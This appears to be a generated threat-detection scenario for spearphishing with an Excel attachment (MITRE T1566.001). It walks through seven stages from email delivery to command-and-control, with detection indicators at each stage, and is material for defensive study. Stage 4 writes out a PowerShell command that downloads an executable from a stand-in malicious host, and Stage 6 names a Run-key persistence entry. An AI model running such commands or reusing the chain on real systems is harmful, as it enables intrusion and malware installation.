<output>
Pattern Name: T1566.001 (Spearphishing Attachment)
Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment designed to exploit a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes persistence on the victim's machine.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Important Document" and an attachment named "Invoice_2023.xlsx".
- **Key Artifacts**: 
  - Email Subject: "Important Document"
  - Attachment: "Invoice_2023.xlsx"
- **Detection Indicators**: Monitor for emails with suspicious attachments, especially those with common file names like "Invoice" or "Report".

**Stage 2: Opening the Malicious Attachment**
- **Applications Involved**: Outlook (parent), Excel (child)
- **User Action**: The user opens the attachment in Excel.
- **Key Artifacts**: 
  - Excel File: "Invoice_2023.xlsx"
- **Detection Indicators**: Track the opening of Excel files from Outlook, especially those that are opened immediately after being downloaded.

**Stage 3: Exploitation of Vulnerability**
- **Applications Involved**: Excel
- **User Action**: The Excel file contains a macro that executes upon opening.
- **Key Artifacts**: 
  - Macro Code: `Sub Auto_Open() ...`
- **Detection Indicators**: Monitor for the execution of macros in Excel files, especially those that are not digitally signed.

**Stage 4: Downloading the Payload**
- **Applications Involved**: Excel (parent), PowerShell (child)
- **User Action**: The macro executes a PowerShell command to download a malicious payload from a remote server.
- **Key Artifacts**: 
  - PowerShell Command: `powershell.exe -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\Users\Victim\Downloads\payload.exe'"`
- **Detection Indicators**: Look for PowerShell commands that download files, especially those initiated from Excel.

**Stage 5: Executing the Payload**
- **Applications Involved**: PowerShell (parent), payload.exe (child)
- **User Action**: The downloaded payload is executed.
- **Key Artifacts**: 
  - Executable: "payload.exe"
- **Detection Indicators**: Monitor for the execution of newly downloaded executables, particularly those that are executed from the Downloads folder.

**Stage 6: Establishing Persistence**
- **Applications Involved**: payload.exe
- **User Action**: The payload modifies the registry to establish persistence.
- **Key Artifacts**: 
  - Registry Key: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\MaliciousApp`
- **Detection Indicators**: Track changes to the registry, especially under the Run key, for entries that appear suspicious or are associated with known malware.

**Stage 7: Command and Control Communication**
- **Applications Involved**: payload.exe
- **User Action**: The payload connects to a command and control server to receive further instructions.
- **Key Artifacts**: 
  - Network Indicator: `http://malicious-server.com`
- **Detection Indicators**: Monitor outbound network traffic for connections to known malicious domains or IP addresses.

</output>